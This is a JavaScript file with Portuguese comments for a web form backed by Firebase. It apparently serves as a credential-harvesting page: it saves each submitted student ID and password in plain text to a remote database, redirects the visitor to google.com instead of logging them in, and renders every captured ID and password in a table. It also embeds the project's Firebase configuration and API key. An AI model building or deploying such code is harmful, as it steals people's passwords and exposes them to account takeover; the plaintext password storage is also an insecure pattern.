import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-app.js";
import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-database.js";

// Configuração do Firebase
const firebaseConfig = {
    apiKey: "AIzaSyAqfDEV6RVMUwnUxjtyrZtyqcmNJIuX0rs",
    authDomain: "sala-tematica.firebaseapp.com",
    databaseURL: "https://sala-tematica-default-rtdb.firebaseio.com",
    projectId: "sala-tematica",
    storageBucket: "sala-tematica.firebasestorage.app",
    messagingSenderId: "135538013642",
    appId: "1:135538013642:web:aa8f7966c1678fa6d70b33",
    measurementId: "G-5KNRX0TW6D"
};

// Inicializando o Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Espera o DOM estar completamente carregado antes de rodar o código
document.addEventListener('DOMContentLoaded', function() {
    // Formulário de cadastro
    const formCadastro = document.getElementById('formCadastro');
    if (formCadastro) {
        formCadastro.addEventListener('submit', function(e) {
            e.preventDefault();

            const matricula = document.getElementById('matricula').value;
            const senha = document.getElementById('senha').value;

            if (matricula && senha) {
                const novoUsuarioRef = ref(database, 'usuarios/' + Date.now());
                set(novoUsuarioRef, {
                    matricula: matricula,
                    senha: senha,
						  data: new Date(Date.now()).toLocaleString()
                }).then(() => {
                    document.getElementById('matricula').value = '';
                    document.getElementById('senha').value = '';
                }).catch((error) => {
                    console.error("Erro ao salvar usuário: ", error);
                });
            }
				window.location.href = 'www.google.com';
        });
    }

    // Carregar dados na página de tabela
    const tabela = document.getElementById('tabelaUsuarios').getElementsByTagName('tbody')[0];

    const usuariosRef = ref(database, 'usuarios');
    onValue(usuariosRef, function(snapshot) {
        tabela.innerHTML = ''; // Limpa a tabela antes de preencher

        snapshot.forEach(function(childSnapshot) {
            const usuario = childSnapshot.val();
            const row = tabela.insertRow();

            const cellmatricula = row.insertCell(0);
            cellmatricula.textContent = usuario.matricula;

            const cellSenha = row.insertCell(1);
            cellSenha.textContent = usuario.senha;
				
            const cellData = row.insertCell(2);
            cellData.textContent = usuario.data;
        });
    });
});
